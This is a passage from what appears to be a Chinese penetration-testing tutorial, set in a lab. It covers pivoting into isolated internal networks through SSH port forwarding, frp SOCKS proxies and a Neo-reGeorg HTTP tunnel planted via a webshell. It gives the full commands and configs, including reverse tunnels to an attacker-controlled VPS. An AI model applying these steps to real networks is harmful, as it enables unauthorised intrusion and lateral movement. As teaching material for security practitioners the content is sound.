隧道"></a>四、SSH 隧道</h2><p>SSH 隧道（SSH Tunnel）是通过 SSH 协议建立的安全网络通道，可以将本地计算机和远程服务器之间的通信流量加密传输，用于传输不安全的协议或访问受限资源，除此之外还可以用来绕过防火墙限制，帮助用户绕过网络访问。</p><h3 id="隧道搭建-2"><a href="#隧道搭建-2" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 主机                           | 环境             |</span><br><span class="line">| ------------------------------ | ---------------- |</span><br><span class="line">| 192.168.11.137                 | 攻击机           |</span><br><span class="line">| 192.168.11.128、192.168.20.100 | 受害者（双网卡） |</span><br><span class="line">| 192.168.20.200                 | 内网主机         |</span><br></pre></td></tr></table></figure></div><p>攻击机 192.168.11.137 ，模拟公网 VPS</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426205042250.png" data-caption="image-20230426205042250"><img src="/../images/tunnel/image-20230426205042250.png" alt="image-20230426205042250"></a></p><p>受害者，双网卡</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426210952158.png" data-caption="image-20230426210952158"><img src="/../images/tunnel/image-20230426210952158.png" alt="image-20230426210952158"></a></p><p>内网主机</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426211026202.png" data-caption="image-20230426211026202"><img src="/../images/tunnel/image-20230426211026202.png" alt="image-20230426211026202"></a></p><p>1、前期环境配置，攻击机上开启ssh转发功能，将GatewayPorts no改成yes并且把前面注释去掉，改为如下图</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426211345157.png" data-caption="image-20230426211345157"><img src="/../images/tunnel/image-20230426211345157.png" alt="image-20230426211345157"></a></p><p>重启ssh服务</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426212238887.png" data-caption="image-20230426212238887"><img src="/../images/tunnel/image-20230426212238887.png" alt="image-20230426212238887"></a></p><h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h4><p>SSH 本地端口转发（Local Port Forwarding）将本地计算机上的端口映射到远程计算机上的技术。</p><p>1、跳板机（双网卡主机）,修改 ssh 配置文件 <code>vim /etc/ssh/sshd_config</code>，配置如下</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AllowTcpForwarding yes # 允许转发TCP协议</span><br><span class="line">GatewayPorts yes # 允许远程主机连接本地转发端口</span><br><span class="line">PermitRootLogin yes # 允许root登录</span><br><span class="line">TCPKeepAlive yes # 保持心跳，防止ssh断开</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426214010225.png" data-caption="image-20230426214010225"><img src="/../images/tunnel/image-20230426214010225.png" alt="image-20230426214010225"></a></p><p>修改完成，重启 ssh服务</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426214048954.png" data-caption="image-20230426214048954"><img src="/../images/tunnel/image-20230426214048954.png" alt="image-20230426214048954"></a></p><p>2、攻击机（VPS）192.168.11.137 与 受害主机 192.168.11.128（web 服务端）建立隧道。使用 ssh 连接到 ip 地址为 192.168.11.128 的主机，使用 funsiooo 用户身份登录，并在本地计算机上创建一个 8888 端口转发，将本地端口 8888 连接到内网的 192.168.20.200 的 22 端口上，实现 ssh 隧道访问隔离网段的内网主机</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L [本机端口]:[隧道访问的内网主机]:[隧道访问的内网主机端口] [双网卡跳板机SSH连接命令]</span><br><span class="line">ssh -CfNg -L 8888:192.168.20.200:22 funsiooo@192.168.11.128</span><br></pre></td></tr></table></figure></div><blockquote><ul><li><code>-C</code>: 启用压缩功能，可以减少数据传输量。</li><li><code>-f</code>: 在后台运行SSH客户端。</li><li><code>-N</code>: 不执行任何命令，只进行端口转发。</li><li><code>-g</code>: 允许远程主机通过转发端口连接本地计算机。</li><li><code>-L</code>: 指定本地端口转发规则，格式为<code>本地端口:目标地址:目标端口</code></li></ul></blockquote><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426222124373.png" data-caption="image-20230426222124373"><img src="/../images/tunnel/image-20230426222124373.png" alt="image-20230426222124373"></a></p><p>查看端口 8888 的占用情况，处于监听状态，正常工作状态</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp | grep 8888</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426222449818.png" data-caption="image-20230426222449818"><img src="/../images/tunnel/image-20230426222449818.png" alt="image-20230426222449818"></a></p><p>3、通过本机连接内网 192.168.20.200 主机，因为 ssh 隧道已搭建，所以当我们 ssh 本机的 8888 端口时，ssh 隧道会将 8888 端口的流量通过跳板机 192.168.11.128 中的 192.168.20.100 网卡访问 192.168.20.200 的 22 端口，实现跨网段访问，注意这次的 ssh 密钥为 192.168.20.200 主机的 ssh 密码（当内网主机为 windows 时，22 端口可变为 3389，在知道密码的情况下可跨网段远程连接windows）</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 8888 root@127.0.0.1</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426222914800.png" data-caption="image-20230426222914800"><img src="/../images/tunnel/image-20230426222914800.png" alt="image-20230426222914800"></a></p><p>隧道流量如下</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426223551493.png" data-caption="image-20230426223551493"><img src="/../images/tunnel/image-20230426223551493.png" alt="image-20230426223551493"></a></p><h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h4><p>SSH 远程端口转发（Remote Port Forwarding）将远程计算机上的端口映射到本地计算机上的端口的技术。</p><p>1、跳板机（双网卡）上执行命令，利用 ssh 建立隧道，将 192.168.20.200 的 22 端口流量转发至攻击者主机 192.168.11.137 的 2222 端口上，隧道建立后，可通过攻击者主机的 2222 端口访问隔离网段 192.168.20.200 的 22 端口，实现跨网段访问。注意此处的 ssh 密码为攻击者 192.168.11.137 主机的 ssh 密码。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -R [远程主机端口]: [目标主机]: [目标主机端口] [攻击者主机]</span><br><span class="line">ssh -R 2222:192.168.20.200:22  root@192.168.11.137</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427211839927.png" data-caption="image-20230427211839927"><img src="/../images/tunnel/image-20230427211839927.png" alt="image-20230427211839927"></a></p><p>攻击者主机 2222 端口正在监听</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427211827875.png" data-caption="image-20230427211827875"><img src="/../images/tunnel/image-20230427211827875.png" alt="image-20230427211827875"></a></p><p>2、攻击机上访问内网主机</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2222 root@127.0.0.1</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427212257242.png" data-caption="image-20230427212257242"><img src="/../images/tunnel/image-20230427212257242.png" alt="image-20230427212257242"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427212206037.png" data-caption="image-20230427212206037"><img src="/../images/tunnel/image-20230427212206037.png" alt="image-20230427212206037"></a></p><p>隧道流量如下</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427212655830.png" data-caption="image-20230427212655830"><img src="/../images/tunnel/image-20230427212655830.png" alt="image-20230427212655830"></a></p><h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h4><p>SSH 动态转发（Dynamic Port Forwarding），也称为 SOCKS 代理，在本地计算机上设置一个 SOCKS 代理，通过 SSH 隧道将网络流量转发到远程服务器上，实现突破边界，访问内部网络资源，类似 frp socks 代理。</p><p>1、服务端（VPS），ssh 开启转发功能，将 GatewayPorts no 改成 yes 并且把前面注释去掉</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427202212608.png" data-caption="image-20230427202212608"><img src="/../images/tunnel/image-20230427202212608.png" alt="image-20230427202212608"></a></p><p>重启 ssh 服务</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430185530115.png" data-caption="image-20230430185530115"><img src="/../images/tunnel/image-20230430185530115.png" alt="image-20230430185530115"></a></p><p>2、客户端（受害者），通过 ssh 开启本地代理 135 端口（端口任意），然后输入本地 ssh 密码，进行监听</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D 0.0.0.0:135 funsiooo@localhost</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430185640688.png" data-caption="image-20230430185640688"><img src="/../images/tunnel/image-20230430185640688.png" alt="image-20230430185640688"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427203742086.png" data-caption="image-20230427203742086"><img src="/../images/tunnel/image-20230427203742086.png" alt="image-20230427203742086"></a></p><p>利用 ssh 远程转发到公网的服务端（VPS）的 2222 端口，此时输入的密码是服务端（VPS）的ssh密码</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -R 0.0.0.0:2222:0.0.0.0:135 root@公网vps</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430185843591.png" data-caption="image-20230430185843591"><img src="/../images/tunnel/image-20230430185843591.png" alt="image-20230430185843591"></a></p><p>服务端（VPS）2222端口已正在监听中</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427203538104.png" data-caption="image-20230427203538104"><img src="/../images/tunnel/image-20230427203538104.png" alt="image-20230427203538104"></a></p><p>3、本机利用 Proxifier 连接 Socks</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430190039259.png" data-caption="image-20230430190039259"><img src="/../images/tunnel/image-20230430190039259.png" alt="image-20230430190039259"></a></p><p>本机代理 socks5 后可直接访问隔离网段 192.168.20.200 的 web 服务</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430171653727.png" data-caption="image-20230430171653727"><img src="/../images/tunnel/image-20230430171653727.png" alt="image-20230430171653727"></a></p><p>隧道流量如下</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430190320771.png" data-caption="image-20230430190320771"><img src="/../images/tunnel/image-20230430190320771.png" alt="image-20230430190320771"></a></p><h2 id="五、Socks-隧道"><a href="#五、Socks-隧道" class="headerlink" title="五、Socks 隧道"></a>五、Socks 隧道</h2><p>SOCKS（Socket Secure）是一种网络协议，它允许客户端通过一个代理服务器访问互联网。与 HTTP 代理不同，SOCKS 代理可以支持任何类型的网络流量，包括 TCP 和 UDP 流量。SOCKS 协议有多个版本，其中 SOCKS5 是最新的版本，它支持加密认证和数据加密等功能。当客户端使用 SOCKS 代理时，它会向代理服务器发送一个连接请求，请求连接到目标服务器。代理服务器会建立与目标服务器之间的连接，并将数据转发给客户端。客户端可以在本地计算机上运行，也可以在另一个网络中运行，例如内网中的计算机。使用 SOCKS 代理可以绕过某些网络限制，也可以保护用户的隐私，因为代理服务器可以隐藏客户端的真实 IP 地址。</p><h3 id="隧道搭建-3"><a href="#隧道搭建-3" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><p>Socks 隧道搭建使用 FRP + proxifier 实现，frp项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a> ,搭建过程中使用到的端口需要在防火墙开放，需要注意不同系统需下载不同版本，如攻击机（服务端）为linux 则需要下载 linux 版本，受害者（客户端）为 windwos 则需要下载 windwos 版本，以下配置直接复制到 frps.ini、frpc.ini 文件运行即可，运行后使用 socks5 代理工具 proxifier 即可进行流量代理。</p><p>1、配置文件如下（根据自身需求进行修改）</p><p>服务端-frps.ini</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0        # 绑定的ip，为本机</span><br><span class="line">bind_port = 7000           # 绑定的端口</span><br><span class="line">dashboard_addr = 0.0.0.0   # 管理地址</span><br><span class="line">dashboard_port = 7500      # web管理端口</span><br><span class="line">dashboard_user = root      # web管理的用户名</span><br><span class="line">dashboard_pwd  = root      # web管理用户的密码</span><br><span class="line">token = 1q2w3e             # 客户端服务端连接的密码，客户端也需要配置相同的token</span><br><span class="line">heartbeat_timeout = 90     # 心跳超时时间</span><br><span class="line">max_pool_count = 5         # 最大同时连接数</span><br></pre></td></tr></table></figure></div><p>客户端-配置frpc.ini</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">tls_enable = true</span><br><span class="line">server_addr = x.x.x.x# 服务端IP（根据自己实际 VPS IP 填写）</span><br><span class="line">server_port = 7000# 服务端监听的端口</span><br><span class="line">token = 1q2w3e# 与服务端的 token 一致才能成功验证</span><br><span class="line">pool_count = 5# 最大连接数</span><br><span class="line">protocol = tcp</span><br><span class="line">health_check_type = tcp</span><br><span class="line">health_check_interval_s = 100</span><br><span class="line">[test]# 代理名称，可自行修改</span><br><span class="line">remote_port = 40000# 代理的端口，连接 proxifier 时需要用</span><br><span class="line">plugin = socks5# 使用的协议</span><br><span class="line">use_encryption = true# 是否加密</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure></div><p>3、使用方法</p><p>配置完服务端与客户端的配置文件后，服务端启动服务</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini </span><br><span class="line"></span><br><span class="line"># 挂在后台运行命令</span><br><span class="line">nohup ./frps -c frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425123300299.png" data-caption="image-20230425123300299"><img src="/../images/tunnel/image-20230425123300299.png" alt="image-20230425123300299"></a></p><p>客户端启动服务，进行连接</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br><span class="line"></span><br><span class="line"># 后台运行命令</span><br><span class="line">nohup ./frpc -c frpc.ini &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425123538555.png" data-caption="image-20230425123538555"><img src="/../images/tunnel/image-20230425123538555.png" alt="image-20230425123538555"></a></p><p>利用 proxifier 进行连接</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430191349822.png" data-caption="image-20230430191349822"><img src="/../images/tunnel/image-20230430191349822.png" alt="image-20230430191349822"></a></p><p>访问内网资源，实现突破网络边界</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425124058682.png" data-caption="image-20230425124058682"><img src="/../images/tunnel/image-20230425124058682.png" alt="image-20230425124058682"></a></p><p>隧道流量如下</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430191552717.png" data-caption="image-20230430191552717"><img src="/../images/tunnel/image-20230430191552717.png" alt="image-20230430191552717"></a></p><h4 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h4><h5 id="frp-多级代理"><a href="#frp-多级代理" class="headerlink" title="frp 多级代理"></a>frp 多级代理</h5><p>通过跳板机-1 将流量代理到服务器（vps）上搭建第一层 frp 代理，获取 192.168.20.200 主机。然后通过 192.168.20.200 搭建第二层代理访问 10.10.20.30 的网络资源。</p><p>跳板机-1</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502145949254.png" data-caption="image-20230502145949254"><img src="/../images/tunnel/image-20230502145949254.png" alt="image-20230502145949254"></a></p><p>跳板机-2</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502153345821.png" data-caption="image-20230502153345821"><img src="/../images/tunnel/image-20230502153345821.png" alt="image-20230502153345821"></a></p><p>需要访问的多层网络内网主机</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502153956115.png" data-caption="image-20230502153956115"><img src="/../images/tunnel/image-20230502153956115.png" alt="image-20230502153956115"></a></p><p>1、第一层代理搭建</p><p>服务端（vps）frps.ini 配置文件</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 2222</span><br></pre></td></tr></table></figure></div><p>客户端（受害者主机 192.168.11.128）frpc.ini 配置文件</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x</span><br><span class="line">server_port = 2222</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.20.100</span><br><span class="line">remote_port = 3333。</span><br><span class="line">local_port 3333</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure></div><p>启动服务端</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502161505106.png" data-caption="image-20230502161505106"><img src="/../images/tunnel/image-20230502161505106.png" alt="image-20230502161505106"></a></p><p>启动客户端</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502161839332.png" data-caption="image-20230502161839332"><img src="/../images/tunnel/image-20230502161839332.png" alt="image-20230502161839332"></a></p><p>本机 proxifier 连接 隧道</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502164653706.png" data-caption="image-20230502164653706"><img src="/../images/tunnel/image-20230502164653706.png" alt="image-20230502164653706"></a></p><p>能访问受害主机的另一网卡 192.168.20.100 的内网资源</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502165032679.png" data-caption="image-20230502165032679"><img src="/../images/tunnel/image-20230502165032679.png" alt="image-20230502165032679"></a></p><p>2、第二层网络搭建</p><p>搭建第二层网络时，跳板机-1既是 frp 的服务端，也是客户端，指向的 IP 不一样，具体请观察配置文件差异</p><p>192.168.11.128 上启动 frps  配置文件如下（注意，此前的 frpc 服务不要关闭）</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.20.100</span><br><span class="line">bind_port = 2222</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502175550215.png" data-caption="image-20230502175550215"><img src="/../images/tunnel/image-20230502175550215.png" alt="image-20230502175550215"></a></p><p>因为这里是假设已经获取了跳板机-2，192.168.20.200 的主机权限，这里启动 frpc ，配置文件如下</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.20.100</span><br><span class="line">server_port = 2222</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.20.200</span><br><span class="line">local_port = 3333</span><br><span class="line">remote_port = 3333</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502175531322.png" data-caption="image-20230502175531322"><img src="/../images/tunnel/image-20230502175531322.png" alt="image-20230502175531322"></a></p><p>3、当 frp 全部服务都开启后，通过 proxifier 设置代理链，然后就可以在本机上访问第二层内网资源了， Proxifier 设置解释为，我们网络首先通过第一层 VPS 的代理网络，然后通过设置 192.168.20.100 的代理进入第二层网络，从而实现多级代理。</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502181506434.png" data-caption="image-20230502181506434"><img src="/../images/tunnel/image-20230502181506434.png" alt="image-20230502181506434"></a></p><p>设置代理链后，可在本机访问第二层的内网资源（下图为10.10.20.30 下 web 服务图片，假装 weblogic）</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230502180938037.png" data-caption="image-20230502180938037"><img src="/../images/tunnel/image-20230502180938037.png" alt="image-20230502180938037"></a></p><blockquote><p>注意，frp 配置文件的端口，需要防火墙开放才能搭建成功，具体端口，根据实际情况设置。</p></blockquote><h2 id="六、HTTP-隧道"><a href="#六、HTTP-隧道" class="headerlink" title="六、HTTP 隧道"></a>六、HTTP 隧道</h2><p>HTTP 隧道是一种使用 HTTP 协议进行数据传输的技术，它可以将内网中的服务映射到公网地址上，实现内网穿透的功能。</p><h3 id="隧道搭建-4"><a href="#隧道搭建-4" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><p>HTTP 隧道搭建使用Neo-reGeorg，项目地址  <a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p>攻击机，不可通内网</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430222233947.png" data-caption="image-20230430222233947"><img src="/../images/tunnel/image-20230430222233947.png" alt="image-20230430222233947"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230501121018884.png" data-caption="image-20230501121018884"><img src="/../images/tunnel/image-20230501121018884.png" alt="image-20230501121018884"></a></p><p>受害者（双网卡），模拟 WEB 服务器</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430200246139.png" data-caption="image-20230430200246139"><img src="/../images/tunnel/image-20230430200246139.png" alt="image-20230430200246139"></a></p><p>1、在攻击机上使用 Python 生成 tunnel.(aspx|ashx|jsp|jspx|php)  脚本，设置密码并上传到 WEB 服务器</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py generate -k password</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430222855435.png" data-caption="image-20230430222855435"><img src="/../images/tunnel/image-20230430222855435.png" alt="image-20230430222855435"></a></p><p>2、在获取 webshell 的情况下，根据网站语言类型上传相应的脚本值 web 服务器中</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430201343337.png" data-caption="image-20230430201343337"><img src="/../images/tunnel/image-20230430201343337.png" alt="image-20230430201343337"></a></p><p>3、连接隧道</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k password -u http://192.168.11.133:8003/tunnel.php -p 2333</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430223344270.png" data-caption="image-20230430223344270"><img src="/../images/tunnel/image-20230430223344270.png" alt="image-20230430223344270"></a></p><p>4、利用 proxifier 连接 socks，访问内网资源</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430230435504.png" data-caption="image-20230430230435504"><img src="/../images/tunnel/image-20230430230435504.png" alt="image-20230430230435504"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430230447663.png" data-caption="image-20230430230447663"><img src="/../images/tunnel/image-20230430230447663.png" alt="image-20230430230447663"></a></p><p>隧道流量如下</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430231412509.png" data-caption="image-20230430231412509"><img src="/../images/tunnel/image-20230430231412509.png" alt="image-20230430231412509"></a></p><h2 id="七、扩展"><a href="#七、扩展" class="headerlink" title="七、扩展"></a>七、扩展</h2><h3 id="出网类型"><a href="#出网类型" class="headerlink" title="出网类型"></a>出网类型</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| 协议    | 命令                    |</span><br><span class="line">| ------- | ----------------------- |</span><br><span class="line">| ICMP    | ping ip/domain          |</span><br><span class="line">| HTTP    | curl ip or domain       |</span><br><span class="line">| DNS     | nslookup domain 8.8.8.8 |</span><br><span class="line">| TCP/UDP | telnet ip port          |</span><br></pre></td></tr></table></figure></div><h3 id="代理类型"><a href="#代理类型" class="headerlink" title="代理类型"></a>代理类型</h3><p>正向代理（Forward Proxy）：代理服务器向外部网络发送请求，通常被用于内部网络无法直接访问外部网络的情况。在这种情况下，客户端向代理服务器发送请求，并在代理服务器上处理并转发请求，作为客户端的代理，代理服务器会将请求发送到目标服务器，接收响应，然后转发给客户端。（例子：公网 frp 作为客户端，内网主机作为服务端）</p><p>反向代理（Reverse Proxy）：代理服务器向内部网络发送请求，通常被用于外部网络无法直接访问内部网络的情况。在这种情况下，代理服务器接收外部网络的请求并在代理服务器上进行处理，并将请求转发到内部服务器。当内部服务器发送响应时，代理服务器将响应返回给外部客户端，从而隐藏了内部服务器的真实 IP 地址和其他信息。（例子：公网 frp 作为服务端，内网主机作为客户端）</p><h3 id="连接类型"><a href="#连接类型" class="headerlink" title="连接类型"></a>连接类型</h3><p>正向连接：客户端向服务器发起连接请求，服务器接受请求并建立连接（例子：受害者主机具备公网IP可出网，此时受害者主机监听一个端口，攻击者主动连接）</p><p>反向连接：服务器主动向客户端发起连接请求，客户端接受请求并建立连接（例子：内网主机能出网，但没有公网IP，攻击者无法直接连接，此时攻击者监听一个端口，受害者主动连接攻击者端口）</p><h2 id="八、总结"><a href="#八、总结" class="headerlink" 